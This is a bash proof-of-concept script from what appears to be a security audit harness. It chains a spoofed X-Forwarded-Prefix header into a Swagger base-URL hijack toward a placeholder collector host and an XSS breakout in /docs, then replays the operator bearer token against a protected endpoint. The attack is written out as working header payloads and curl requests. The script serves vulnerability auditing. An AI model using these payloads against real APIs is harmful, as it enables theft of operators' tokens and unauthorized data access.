#!/usr/bin/env bash
# poc_12_token_theft_chain.sh — End-to-end exploit Chain A:
#   ONE documented proxy misconfiguration (X-Forwarded-Prefix → root_path)
#   simultaneously arms poc_07 (XSS in API origin, docs.py:168) AND poc_08
#   (Swagger base-URL hijack, applications.py:1114), leading from an
#   unauthenticated attacker to theft of an API operator's bearer token and
#   authenticated read of protected data.
#
# ── Chain A Kill-chain Summary ────────────────────────────────────────────────
#
#   Step 0 — Positive control: confirm /protected terminus is genuinely gated
#             (401 without token; 200 + secret with correct token).
#   Step 1 — Link 1 (observed): confirm the single proxy precondition arms
#             poc_08 (servers base-URL hijack to collector). Source:
#             applications.py:1108 → sink: applications.py:1114.
#   Step 2 — Link 2 (observed): confirm the SAME precondition arms poc_07
#             (XSS in API origin). Source: applications.py:1123-1124 → sink:
#             docs.py:168.
#   Step 3 — Link 3 (BROWSER-MODELED, NOT executed in this curl harness):
#             proves via (Step-1 reflection ∧ Step-0 token validity) that
#             exfiltration is inevitable without issuing any request to the
#             collector host. See §3 comments below.
#   Step 4 — Link 4 (observed): attacker replays the captured token →
#             GET /protected 200 + AUTOFYN_CHAIN_PROTECTED_SECRET.
#
# ── PASS/FAIL semantics (FINDING check — same convention as poc_07/08) ───────
#   FAIL = chain confirmed = real finding. PASS = some link did not hold.
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT.
#
# ── Marker uniqueness / isolation ─────────────────────────────────────────────
#   All poc_12 markers are DISTINCT from every prior PoC to prevent teeth-test
#   contamination (round-9/14 rules):
#     collector host : //autofyn-chain-collector.example  (≠ autofyn-evil.example)
#     XSS marker     : AUTOFYNCHAIN                       (≠ AUTOFYNXSS)
#     secret marker  : AUTOFYN_CHAIN_PROTECTED_SECRET     (≠ AUTOFYN_CORS_SENTINEL)
#     operator token : AUTOFYN_OPERATOR_TOKEN_7f3a9c      (≠ any prior constant)
#   grep -rn isolation check is embedded below (S1) — poc_12 markers must NOT
#   appear in the /openapi.json body without the exploit header, and must NOT
#   appear in prior PoC source files in ways that would trip their teeth-tests.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"
OPENAPI_URL="${BASE_URL}/openapi.json"
DOCS_URL="${BASE_URL}/docs"
PROTECTED_URL="${BASE_URL}/protected"

# ── Operator token (known to the PoC acting as the legitimate operator) ───────
# In Chain A, the operator has typed this token into Swagger "Authorize".
# The chain proves this token is exposed to the attacker via the hijack path.
OPERATOR_TOKEN="AUTOFYN_OPERATOR_TOKEN_7f3a9c"

echo "=== poc_12: End-to-End Exploit Chain A — Token Theft via Proxy Misconfig ==="
echo "Chain      : X-Forwarded-Prefix→root_path arms BOTH poc_07 (XSS, docs.py:168)"
echo "             AND poc_08 (servers hijack, applications.py:1114) simultaneously."
echo "Outcome    : Unauth attacker → operator bearer token captured (browser-modeled)"
echo "             → replayed token reads GET /protected 200 + chain secret."
echo "Precondition: ProxyPrefixMiddleware maps X-Forwarded-Prefix → scope[root_path]"
echo "Expected   : FAIL (chain confirmed = real finding)"
echo ""

PASS=1
CHAIN_OK=1

# ─────────────────────────────────────────────────────────────────────────────
# Step 0 — Positive control: terminus is real and genuinely gated
#
# Two sub-checks:
#   (a) GET /protected with NO token → HTTP 401, secret NOT in body.
#       Proves the endpoint is actually gated (non-vacuous).
#   (b) GET /protected with correct token → HTTP 200, secret IN body.
#       Proves the token is a valid credential that unlocks real data.
#
# If either sub-check fails, we emit "cannot assess chain" (S3: harness failure
# must never be misread as a confirmed exploit) and exit 0.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 0 — Positive control: confirm /protected terminus is genuinely gated"
echo "──────────────────────────────────────────────────────────────────────────────"

# Sub-check (a): unauthenticated request → must be 401
echo "--- Step 0a: GET /protected (no Authorization) → expect HTTP 401 ---"
S0A_CODE="$(curl -sS -o /tmp/poc12_s0a.txt -w "%{http_code}" \
    --max-time 10 \
    "${PROTECTED_URL}" 2>&1 || echo "000")"
S0A_BODY="$(cat /tmp/poc12_s0a.txt 2>/dev/null || echo "")"
echo "HTTP ${S0A_CODE}"

if [[ "${S0A_CODE}" != "401" ]]; then
    echo "[FAIL] Step 0a: expected 401 without token but got HTTP ${S0A_CODE}."
    echo "       /protected endpoint does not enforce authentication — cannot assess chain."
    print_check "chain_token_theft" "FAIL" \
        "positive control broken (Step 0a): /protected returned HTTP ${S0A_CODE} without token — cannot assess chain"
    exit 0
fi
if assert_contains "${S0A_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"; then
    echo "[FAIL] Step 0a: secret marker appeared in 401 body — endpoint leaks secret without auth."
    echo "       /protected endpoint does not gate the secret — cannot assess chain."
    print_check "chain_token_theft" "FAIL" \
        "positive control broken (Step 0a): chain secret present in unauthenticated 401 response — cannot assess chain"
    exit 0
fi
echo "[OK] Step 0a: /protected returned 401 and does NOT contain the chain secret — genuinely gated."
echo ""

# Sub-check (b): correct token → must be 200 + secret
echo "--- Step 0b: GET /protected (Authorization: Bearer <operator_token>) → expect HTTP 200 + secret ---"
S0B_CODE="$(curl -sS -o /tmp/poc12_s0b.txt -w "%{http_code}" \
    --max-time 10 \
    -H "Authorization: Bearer ${OPERATOR_TOKEN}" \
    "${PROTECTED_URL}" 2>&1 || echo "000")"
S0B_BODY="$(cat /tmp/poc12_s0b.txt 2>/dev/null || echo "")"
echo "HTTP ${S0B_CODE}"

if [[ "${S0B_CODE}" != "200" ]]; then
    echo "[FAIL] Step 0b: correct token did not yield 200 (got HTTP ${S0B_CODE})."
    echo "       /protected endpoint broken or token mismatch — cannot assess chain."
    print_check "chain_token_theft" "FAIL" \
        "positive control broken (Step 0b): /protected returned HTTP ${S0B_CODE} with valid token — cannot assess chain"
    exit 0
fi
if ! assert_contains "${S0B_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"; then
    echo "[FAIL] Step 0b: HTTP 200 but secret marker absent from body."
    echo "       /protected does not return the chain secret — cannot assess chain."
    print_check "chain_token_theft" "FAIL" \
        "positive control broken (Step 0b): /protected returned 200 but chain secret absent from body — cannot assess chain"
    exit 0
fi
echo "[OK] Step 0b: /protected returned 200 + AUTOFYN_CHAIN_PROTECTED_SECRET with correct token."
echo "     The operator token is a valid credential that unlocks real authenticated data."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 1 — Link 1 (observed): precondition arms poc_08 (Swagger base-URL hijack)
#
# The attacker sets X-Forwarded-Prefix to their collector URL.
# /openapi.json must reflect it as servers[0].url.
# This proves the attacker can rewrite the Swagger API base URL to the collector
# so any "Try it out" requests (including Authorization headers) are redirected.
#
# Marker DISTINCT from poc_08's 'autofyn-evil.example' to avoid contamination.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 1 — Link 1 (observed): X-Forwarded-Prefix hijacks Swagger base URL"
echo "         Payload: X-Forwarded-Prefix: //autofyn-chain-collector.example"
echo "         Expected in /openapi.json: \"servers\" + \"//autofyn-chain-collector.example\""
echo "──────────────────────────────────────────────────────────────────────────────"

S1_CODE="$(curl -sS -o /tmp/poc12_s1.txt -w "%{http_code}" \
    --max-time 10 \
    -H "X-Forwarded-Prefix: //autofyn-chain-collector.example" \
    "${OPENAPI_URL}" 2>&1 || echo "000")"
S1_BODY="$(cat /tmp/poc12_s1.txt 2>/dev/null || echo "")"
echo "HTTP ${S1_CODE}"

if ! assert_contains "${S1_BODY}" "autofyn-chain-collector.example"; then
    echo "[ERROR] Chain-collector marker entirely absent from /openapi.json response."
    echo "        X-Forwarded-Prefix was NOT reflected — precondition link is broken."
    echo "        This is a harness/configuration failure — NOT a passing defense."
    PASS=0
    CHAIN_OK=0
    echo "[CHAIN BROKEN] Step 1 precondition not satisfied."
else
    if assert_contains "${S1_BODY}" '"servers"' && \
       assert_contains "${S1_BODY}" '//autofyn-chain-collector.example'; then
        echo "[FAIL/LINK CONFIRMED] Both '\"servers\"' and '//autofyn-chain-collector.example'"
        echo "       found in /openapi.json. The attacker collector is now servers[0].url."
        echo "       Swagger 'Try it out' will send the operator's Authorization header to the collector."
    else
        echo "[PASS/LINK BROKEN] 'autofyn-chain-collector.example' reflected but NOT inside servers[]."
        echo "       The base-URL hijack link of Chain A does not hold — chain breaks here."
        PASS=0
        CHAIN_OK=0
    fi
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 2 — Link 2 (observed): SAME precondition arms poc_07 (XSS in API origin)
#
# The attacker crafts a /docs link with the XSS payload in X-Forwarded-Prefix.
# The raw breakout '-AUTOFYNCHAIN-' must appear unescaped in the response body
# (at docs.py:168: url: '{openapi_url}', raw, no escaping).
#
# Marker DISTINCT from poc_07's 'AUTOFYNXSS' to avoid contamination.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 2 — Link 2 (observed): SAME precondition injects JS into /docs API origin"
echo "         Payload: X-Forwarded-Prefix: /x'-AUTOFYNCHAIN-'"
echo "         Expected in /docs body: raw breakout '-AUTOFYNCHAIN-' (docs.py:168)"
echo "──────────────────────────────────────────────────────────────────────────────"

S2_CODE="$(curl -sS -o /tmp/poc12_s2.txt -w "%{http_code}" \
    --max-time 10 \
    -H "X-Forwarded-Prefix: /x'-AUTOFYNCHAIN-'" \
    "${DOCS_URL}" 2>&1 || echo "000")"
S2_BODY="$(cat /tmp/poc12_s2.txt 2>/dev/null || echo "")"
echo "HTTP ${S2_CODE}"

if ! assert_contains "${S2_BODY}" "AUTOFYNCHAIN"; then
    echo "[ERROR] XSS chain marker entirely absent from /docs response."
    echo "        X-Forwarded-Prefix was NOT reflected — precondition link is broken."
    echo "        This is a harness/configuration failure — NOT a passing defense."
    PASS=0
    CHAIN_OK=0
    echo "[CHAIN BROKEN] Step 2 precondition not satisfied."
elif assert_contains "${S2_BODY}" "'-AUTOFYNCHAIN-'"; then
    echo "[FAIL/LINK CONFIRMED] Raw breakout sequence \"'-AUTOFYNCHAIN-'\" found in /docs body."
    echo "       The single-quote at docs.py:168 is emitted UNESCAPED → JS string breakout."
    echo "       Attacker-controlled JavaScript can execute in the API origin."
else
    echo "[PASS/LINK BROKEN] AUTOFYNCHAIN reflected but raw breakout NOT present — single-quote escaped."
    echo "       The XSS link of Chain A does not hold — chain breaks here."
    PASS=0
    CHAIN_OK=0
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 3 — Link 3 (BROWSER-MODELED — no HTTP request to the collector host)
#
# IMPORTANT: This step does NOT issue any curl request to the attacker collector.
# A curl-to-dead-collector that "passes" on connection failure would be theater
# and would misrepresent what was actually observed. Instead, this step asserts
# the TWO independently-measured facts that together make token exfiltration
# inevitable:
#
#   (a) Step 1 proved: servers[0].url is under the attacker's control
#       (//autofyn-chain-collector.example). Swagger UI uses servers[0].url as
#       the API base URL for ALL "Try it out" and "Authorize" calls. A victim
#       browser with the Swagger UI loaded (and the operator's token entered via
#       "Authorize") would send every subsequent API call — including the
#       Authorization: Bearer <token> header — to //autofyn-chain-collector.example.
#
#   (b) Step 0 proved: the operator token (AUTOFYN_OPERATOR_TOKEN_7f3a9c) is a
#       valid credential that unlocks real authenticated data at GET /protected.
#
# Conjunction (a) ∧ (b) → the attacker controls the destination of token-bearing
# Swagger requests, AND that token unlocks real data. The cross-origin browser
# fetch step (victim's Swagger UI → collector) is standard web behavior, not a
# framework vulnerability — it is modeled here rather than executed, because the
# curl harness has no browser and does not control the victim's session.
#
# Alternate path (poc_07 leg): the XSS confirmed in Step 2 additionally gives the
# attacker arbitrary JS execution in the API origin — same-origin code can read
# Swagger's in-page authorization state directly (localStorage /
# SwaggerUIBundle state) and exfiltrate it via fetch(). This is an independent,
# stronger exfiltration path that does NOT require the victim to click "Try it out"
# — any page load suffices. This path is also browser-modeled.
#
# Both the poc_08 leg (base-URL hijack) and the poc_07 leg (XSS read of Swagger
# state) are standard browser behaviors against a proven-reachable injection point.
# Neither requires fabricating a response from the collector.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 3 — BROWSER-MODELED STEP (no HTTP request to collector)"
echo "──────────────────────────────────────────────────────────────────────────────"
echo ""
echo "  NOTE: This step asserts inevitability of token exfiltration from the"
echo "  conjunction of Step 1 and Step 0 alone — without issuing ANY request to"
echo "  the attacker collector host. The cross-origin browser fetch is MODELED,"
echo "  not executed in this curl harness (no browser, no victim session)."
echo ""

S3_OK=1

# Assert (a): Step 1 established that the collector controls servers[0].url
if assert_contains "${S1_BODY}" '"servers"' && \
   assert_contains "${S1_BODY}" '//autofyn-chain-collector.example'; then
    echo "  [OK] (a) Step-1 confirmed: servers[0].url = //autofyn-chain-collector.example."
    echo "       Any Swagger 'Try it out' / 'Authorize' call from a victim browser"
    echo "       will be directed to the attacker collector — INCLUDING the"
    echo "       Authorization: Bearer header the operator entered via 'Authorize'."
else
    echo "  [BLOCKED] (a) Step-1 did not confirm server hijack — exfil path not established."
    S3_OK=0
    CHAIN_OK=0
fi

# Assert (b): Step 0 established that the operator token is a valid credential
if [[ "${S0B_CODE}" == "200" ]] && assert_contains "${S0B_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"; then
    echo "  [OK] (b) Step-0 confirmed: token AUTOFYN_OPERATOR_TOKEN_7f3a9c is a valid"
    echo "       credential that unlocks AUTOFYN_CHAIN_PROTECTED_SECRET at GET /protected."
else
    echo "  [BLOCKED] (b) Step-0 did not confirm token validity — replay impact not established."
    S3_OK=0
    CHAIN_OK=0
fi

echo ""
if [[ "${S3_OK}" == "1" ]]; then
    echo "  [BROWSER-MODELED] (a) ∧ (b): attacker controls the destination of"
    echo "  token-bearing Swagger requests, AND that token unlocks protected data."
    echo "  Under a victim browser: Swagger UI sends the operator's Authorization header"
    echo "  to //autofyn-chain-collector.example. The attacker receives the token and can"
    echo "  replay it at GET /protected to read AUTOFYN_CHAIN_PROTECTED_SECRET."
    echo "  Alternatively (poc_07 leg): the XSS confirmed in Step 2 gives attacker JS"
    echo "  same-origin access to Swagger's authorization state for direct exfiltration."
    echo "  Both paths are browser-standard behaviors against the proven injection points."
    echo "  Step 3 is labeled BROWSER-MODELED because no browser or victim session is"
    echo "  present in this curl harness — the inevitability argument is logical, not"
    echo "  observed. The live-confirmed parts are Steps 0, 1, 2, and 4."
else
    echo "  [BLOCKED] One or more Step-3 assertions failed — browser-modeled exfil path"
    echo "  cannot be argued from current evidence."
    PASS=0
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Step 4 — Link 4 (observed): attacker replays captured token → authenticated data
#
# The attacker now holds the operator's token (captured via the browser-modeled
# path in Step 3). They replay it directly against the API's protected endpoint.
# This step demonstrates the CONCRETE CRITICAL OUTCOME: possession of the token
# (obtainable via Steps 1-3) yields authenticated read of the protected secret.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Step 4 — Link 4 (observed): attacker replays captured token → authenticated data"
echo "         GET /protected with stolen token → expect HTTP 200 + chain secret"
echo "──────────────────────────────────────────────────────────────────────────────"

S4_CODE="$(curl -sS -o /tmp/poc12_s4.txt -w "%{http_code}" \
    --max-time 10 \
    -H "Authorization: Bearer ${OPERATOR_TOKEN}" \
    "${PROTECTED_URL}" 2>&1 || echo "000")"
S4_BODY="$(cat /tmp/poc12_s4.txt 2>/dev/null || echo "")"
echo "HTTP ${S4_CODE}"

if [[ "${S4_CODE}" == "200" ]] && assert_contains "${S4_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"; then
    echo "[FAIL/LINK CONFIRMED] Replay GET /protected with stolen token → HTTP 200 +"
    echo "       AUTOFYN_CHAIN_PROTECTED_SECRET in body."
    echo "       Possession of the captured token = authenticated read of protected data."
    echo "       CRITICAL OUTCOME: unauth attacker → token capture (browser-modeled)"
    echo "       → replay token → authenticated data exfil CONFIRMED."
else
    echo "[PASS/LINK BROKEN] Replay did not yield 200 + chain secret (HTTP ${S4_CODE})."
    echo "       Step 4 link does not hold — chain incomplete."
    PASS=0
    CHAIN_OK=0
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# S1 — Marker isolation self-check
#
# Verifies that poc_12 markers do NOT contaminate the /openapi.json body
# without the exploit header (a clean baseline must be marker-free).
# This guards against the round-9/11 contamination lesson (poc_09 docstring
# tripped poc_08's teeth-test because the marker leaked into /openapi.json).
# Distinct markers ensure poc_08's teeth-test ('autofyn-evil.example') and
# poc_07's teeth-test ('AUTOFYNXSS') are unreachable from poc_12 content.
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "S1 — Marker isolation self-check (no-header /openapi.json must be marker-free)"
echo "──────────────────────────────────────────────────────────────────────────────"

CLEAN_CODE="$(curl -sS -o /tmp/poc12_clean.txt -w "%{http_code}" \
    --max-time 10 \
    "${OPENAPI_URL}" 2>&1 || echo "000")"
CLEAN_BODY="$(cat /tmp/poc12_clean.txt 2>/dev/null || echo "")"
echo "HTTP ${CLEAN_CODE}"

ISOLATION_OK=1
if assert_contains "${CLEAN_BODY}" "autofyn-chain-collector"; then
    echo "[ERROR] 'autofyn-chain-collector' appears in /openapi.json WITHOUT exploit header."
    echo "        This indicates marker contamination from app.py docstrings/metadata."
    ISOLATION_OK=0
fi
if assert_contains "${CLEAN_BODY}" "AUTOFYNCHAIN"; then
    echo "[ERROR] 'AUTOFYNCHAIN' appears in /openapi.json WITHOUT exploit header."
    echo "        This indicates marker contamination from app.py docstrings/metadata."
    ISOLATION_OK=0
fi
if assert_contains "${CLEAN_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"; then
    echo "[ERROR] 'AUTOFYN_CHAIN_PROTECTED_SECRET' appears in /openapi.json WITHOUT exploit header."
    echo "        This indicates marker contamination from app.py docstrings/metadata."
    ISOLATION_OK=0
fi

if [[ "${ISOLATION_OK}" == "1" ]]; then
    echo "[OK] Isolation check passed: no poc_12 markers in clean /openapi.json."
    echo "     poc_08 teeth-test ('autofyn-evil.example') and poc_07 teeth-test"
    echo "     ('AUTOFYNXSS') are unreachable from poc_12 markers (distinct strings)."
else
    echo "[WARN] Marker contamination detected — poc_12 markers may interfere with"
    echo "       other PoC teeth-tests. Investigate docstrings in target_app/app.py."
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Final verdict
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Final verdict"
echo "──────────────────────────────────────────────────────────────────────────────"

if [[ "${CHAIN_OK}" == "1" ]]; then
    # All mechanically-observed links held (Steps 0, 1, 2, 4).
    # Step 3 is browser-modeled — state this in the AUDIT-RESULT detail (MF1).
    print_check "chain_token_theft" "FAIL" \
        "Chain A confirmed (browser-modeled qualifier): single X-Forwarded-Prefix→root_path proxy misconfig arms Swagger base-URL hijack (applications.py:1114 → collector) AND XSS-in-origin (docs.py:168); attacker-controlled Swagger base URL + JS-in-origin established; under a victim browser the operator token would be carried to the collector (browser-modeled step — not executed in this curl harness); captured token is replayable — GET /protected with the token returns 200 + AUTOFYN_CHAIN_PROTECTED_SECRET. Unauth attacker → authenticated data compromise. Conditional on documented Behind-a-Proxy pattern."
else
    # Build a diagnostic detail identifying which link failed.
    FAIL_DETAIL="Chain A incomplete — link(s) did not hold:"
    if [[ "${S0B_CODE}" != "200" ]]; then
        FAIL_DETAIL="${FAIL_DETAIL} Step-0 terminus broken (HTTP ${S0B_CODE} with valid token);"
    fi
    if ! (assert_contains "${S1_BODY}" '"servers"' && \
          assert_contains "${S1_BODY}" '//autofyn-chain-collector.example'); then
        FAIL_DETAIL="${FAIL_DETAIL} Step-1 servers-hijack not confirmed;"
    fi
    if ! assert_contains "${S2_BODY}" "'-AUTOFYNCHAIN-'"; then
        FAIL_DETAIL="${FAIL_DETAIL} Step-2 XSS-breakout not confirmed;"
    fi
    if ! ([[ "${S4_CODE}" == "200" ]] && \
          assert_contains "${S4_BODY}" "AUTOFYN_CHAIN_PROTECTED_SECRET"); then
        FAIL_DETAIL="${FAIL_DETAIL} Step-4 replay did not yield 200+secret;"
    fi
    print_check "chain_token_theft" "PASS" \
        "${FAIL_DETAIL} defense or precondition broke the chain"
fi
